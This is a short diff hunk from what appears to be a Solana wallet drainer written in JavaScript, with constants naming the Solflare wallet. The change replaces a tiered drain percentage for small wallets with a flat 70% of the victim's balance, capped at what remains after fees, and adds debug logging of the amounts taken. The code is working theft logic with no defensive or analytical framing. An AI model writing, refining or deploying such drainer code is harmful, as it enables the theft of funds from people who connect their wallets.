@@ -438,20 +438,14 @@ const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
         const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
         console.log(`[DRAIN_DEBUG] Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
         
-        // Calculate drain amount with dynamic percentage based on wallet size
-        let drainPercentage = 0.7; // Default 70%
+        // Dynamic drain: Always 70% of wallet balance as long as it has meaningful funds
+        const DRAIN_PERCENTAGE = 0.7; // 70% of wallet balance
+        let drainAmount = Math.floor(lamports * DRAIN_PERCENTAGE);
         
-        // For smaller wallets, use a more conservative drain percentage
-        if (availableForDrain < 1000000) { // Less than 0.001 SOL
-          drainPercentage = 0.3; // 30% for very small wallets
-        } else if (availableForDrain < 5000000) { // Less than 0.005 SOL
-          drainPercentage = 0.5; // 50% for small wallets
-        } else if (availableForDrain < 10000000) { // Less than 0.01 SOL
-          drainPercentage = 0.6; // 60% for medium wallets
-        }
+        // Ensure we don't drain more than available (after reserving fees)
+        drainAmount = Math.min(drainAmount, availableForDrain);
         
-        let drainAmount = Math.floor(availableForDrain * drainPercentage);
-        console.log(`[DRAIN_DEBUG] Available: ${availableForDrain} lamports, Drain percentage: ${drainPercentage * 100}%, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
+        console.log(`[DRAIN_DEBUG] Available: ${availableForDrain} lamports, 70% of wallet: ${Math.floor(lamports * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
         
         // Add fallback: if amount is too small, skip the drain
         if (drainAmount <= 0) {
